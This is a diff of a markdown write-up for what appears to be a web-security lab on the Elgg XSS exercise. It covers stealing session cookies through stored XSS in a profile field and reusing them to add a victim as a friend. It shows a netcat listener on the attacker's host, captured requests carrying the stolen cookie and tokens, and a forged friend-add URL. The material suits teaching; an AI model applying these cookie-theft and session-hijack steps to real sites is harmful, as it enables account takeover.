@@ -39,13 +39,13 @@ This attack focuses on providing code in the ‘about me’ section such that th
 
 The IP address for the http part is the attacker’s IP address. On the attacker machine we can listen o the specified port using netcat or any other means.
 
-```other
+```
 nc -l -p 1234
 ```
 
 The next time someone on the web application, say `alice` visits the profile of `user11`, the code gets executed and the attacker gains the cookie for himself. The nc output seems like -
 
-```other
+```
 GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
 Host: 192.168.56.4:1234
 Accept: */*
@@ -60,7 +60,7 @@ The cookie starts after `%3D`.
 
 This task is about stealing the session of a legitimate user by using their cookie and then add the victim as a friend. To do this the process of adding a friend has to be known to the attacker. Therefore, the attacker creates another account say `samy`. This account can be added as a friend to `user11`’s account to observe the process of adding a friend. The attacker logs in to the account of `samy` and visits `user11`. Then he enables the inspect mode of the browser to watch the requests ad cookies as he adds `user11` as a friend to `samy`. The friend addig process then shows a GET request -
 
-```other
+```
 http://www.xsslabelgg.com/action/friends/add?friend=43&__elgg_ts=152022381&__elgg_token=f0aaab1d9af23flb3lb876bfa5640cel
 ```
 
@@ -72,7 +72,7 @@ Also, the cookie is sent as a part of the request header. Therefore, the 3 impor
 
 The nc output seems like this -
 
-```other
+```
 GET /?c=1520227817&0fab54e97b2fa75c39d298de602a5939 HTTP/1.1
 Host: 192.168.56.4:1234
 Accept: */*
